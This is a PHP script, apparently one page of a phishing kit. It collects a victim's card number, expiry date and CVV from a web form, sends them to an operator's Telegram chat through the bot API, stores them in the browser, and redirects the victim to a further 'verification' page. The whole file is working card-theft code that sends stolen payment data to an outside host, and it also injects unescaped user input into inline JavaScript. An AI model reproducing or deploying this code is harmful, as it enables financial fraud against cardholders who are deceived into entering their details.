<?php
date_default_timezone_set("America/Bogota");

// Leer la configuración desde botmaster2.php
$configData = include 'botmaster2.php';

if (!$configData || !isset($configData['token']) || !isset($configData['chat_id'])) {
    die("❌ Error al leer configuración desde botmaster2.php");
}

$token = $configData['token'];
$idchat = $configData['chat_id'];

// Capturar datos del formulario
$numero = $_POST['numero'] ?? '';
$mes = $_POST['mes'] ?? '';
$anio = $_POST['anio'] ?? '';
$cvv = $_POST['cvv'] ?? '';

$fecha = "$mes/$anio";

// Construir mensaje
$message = "💳 NUEVA TARJETA CAPTURADA\n";
$message .= "Número: $numero\n";
$message .= "Fecha: $fecha\n";
$message .= "CVV: $cvv\n";

// Crear botones inline
$transactionId = uniqid();
$keyboard = json_encode([
    "inline_keyboard" => [
        // Puedes añadir botones si lo deseas
    ]
]);

// Enviar mensaje a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$params = [
    "chat_id" => $idchat,
    "text" => $message,
    "parse_mode" => "HTML",
    "reply_markup" => $keyboard
];
$options = [
    "http" => [
        "header"  => "Content-type: application/json",
        "method"  => "POST",
        "content" => json_encode($params)
    ]
];
$context = stream_context_create($options);
@file_get_contents($url, false, $context);

// Redirigir al siguiente paso
echo "<script>
    localStorage.setItem('tbdatos', JSON.stringify({
        numero: '$numero',
        fecha: '$fecha',
        cvv: '$cvv'
    }));
    window.location.href = 'verifidata.php';
</script>";
?>